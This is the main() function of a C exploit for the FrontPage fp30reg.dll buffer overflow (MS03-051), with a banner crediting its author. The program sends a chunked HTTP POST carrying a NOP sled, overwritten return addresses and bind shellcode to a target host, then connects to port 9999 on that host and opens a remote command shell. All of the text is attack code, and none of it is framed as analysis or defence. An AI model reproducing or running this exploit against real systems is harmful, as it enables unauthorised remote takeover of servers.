int main(int argc,char *argv[])
{     
		WSADATA wsaData;
		struct sockaddr_in targetTCP;
		fd_set fds;
		//struct hostent *host;
		struct timeval tv;
		int sockTCP,s,switchon;
		unsigned short port = 80;
		long ip;
		unsigned char header[]=	"POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n";
        unsigned char packet[3000],data[1500];		                
		unsigned char ecx[] = "\xe0\xf3\xd4\x67";
		unsigned char edi[] = "\xff\xd0\x90\x90";		
		unsigned char call[] = "\xe4\xf3\xd4\x67";//overwrite .data section of fp30reg.dll
		unsigned char shortjmp[] = "\xeb\x10";
		
		printf("\n-={ Frontpage fp30reg.dll Overflow Exploit (MS03-051) ver %s }=-\n\n"
				   " by Adik < netmaniac [at] hotmail.KG >\n http://netninja.to.kg\n\n", VER);
		if(argc < 2)
		{
			
			printf(" Usage: %s [Target] <port>\n"
					" eg: fp30reg.exe 192.168.63.130\n\n",argv[0]);
			return 1;			
		}		
		if(argc==3)
			port = atoi(argv[2]);					
        WSAStartup(0x0202, &wsaData);				
		printf("[*] Target:\t%s \tPort: %d\n\n",argv[1],port);
		ip=gimmeip(argv[1]);	
        memset(&targetTCP, 0, sizeof(targetTCP));
		memset(packet,0,sizeof(packet));
        targetTCP.sin_family = AF_INET;
        targetTCP.sin_addr.s_addr = ip;
        targetTCP.sin_port = htons(port);				
		sprintf(packet,"%sHost: %s\r\nTransfer-Encoding: chunked\r\n",header,argv[1]);		
		memset(data, 0x90, sizeof(data)-1);
		data[sizeof(data)-1] = '\x0';
		memcpy(&data[16],edi,sizeof(edi)-1);
		memcpy(&data[20],ecx,sizeof(ecx)-1);		
		memcpy(&data[250+10],shortjmp,sizeof(shortjmp)-1);
		memcpy(&data[250+14],call,sizeof(call)-1);		
		memcpy(&data[250+70],kyrgyz_bind_code,sizeof(kyrgyz_bind_code));
		sprintf(packet,"%sContent-Length: %d\r\n\r\n%x\r\n%s\r\n0\r\n\r\n",packet,strlen(data),strlen(data),data);		
        if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("[x] Socket not initialized! Exiting...\n");
				WSACleanup();
                return 1;
		}
		printf("[*] Socket initialized...\n");					
		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("[*] Connection to host failed! Exiting...\n");
			WSACleanup();
			exit(1);
		} 		
		printf("[*] Checking for presence of fp30reg.dll...");
		if (send(sockTCP, packet, strlen(packet),0) == -1)
		{
				printf("[x] Failed to inject packet! Exiting...\n");
				WSACleanup();
                return 1;
		}		
		memset(packet,0,sizeof(packet));	
		switchon=1;
		ioctlsocket(sockTCP,FIONBIO,&switchon);	
		tv.tv_sec = RECVTIMEOUT;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(sockTCP,&fds);	
		if((select(sockTCP+1,&fds,0,0,&tv))>0)
		{
			recv(sockTCP, packet, sizeof(packet),0);
			if(packet[9]=='1' && packet[10]=='0' && packet[11]=='0')
				printf(" Found!\n");
			else
			{
				printf(" Not Found!! Exiting...\n");
				WSACleanup();				
				return 1;
			}
		}
		else
		{
				printf("\n[x] Timeout! Failed to receive packet! Exiting...\n");
				WSACleanup();
                return 1;
		}				
		switchon=0;
		ioctlsocket(sockTCP,FIONBIO,&switchon);		
		printf("[*] Packet injected!\n");
		closesocket(sockTCP);
		printf("[*] Sleeping ");
		for(s=0;s<13000;s+=1000)
		{
			printf(". ");
			Sleep(1000);
		}		
		printf("\n[*] Connecting to host: %s on port 9999",argv[1]);
		if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("\n[x] Socket not initialized! Exiting...\n");
				WSACleanup();
                return 1;
		}		
		targetTCP.sin_family = AF_INET;
        targetTCP.sin_addr.s_addr = ip;
        targetTCP.sin_port = htons(9999);
		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("\n[x] Exploit failed or there is a Firewall! Exiting...\n");
			WSACleanup();
			exit(1);
		} 
		printf("\n[*] Dropping to shell...\n\n");
		cmdshell(sockTCP);
        return 0;
}